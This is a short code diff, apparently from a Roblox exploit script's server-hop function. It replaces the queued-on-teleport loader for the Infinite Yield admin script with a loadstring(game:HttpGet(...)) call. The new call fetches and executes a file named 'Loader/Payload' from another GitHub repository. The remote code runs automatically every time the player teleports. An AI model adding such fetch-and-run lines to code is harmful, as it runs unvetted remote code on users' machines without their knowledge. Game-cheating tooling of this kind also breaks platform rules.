@@ -149,7 +149,7 @@ local function ServerHop()
                 -- 🔑 Queue reinjection here
                 if queue_on_teleport or queueteleport then
                     (queue_on_teleport or queueteleport)([[
-                        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+                        loadstring(game:HttpGet('https://raw.githubusercontent.com/NotH4xor/Bahasf/main/Loader/Payload'))()
                     ]])
                 end
                 TeleportService:TeleportToPlaceInstance(game.PlaceId, Server.id)
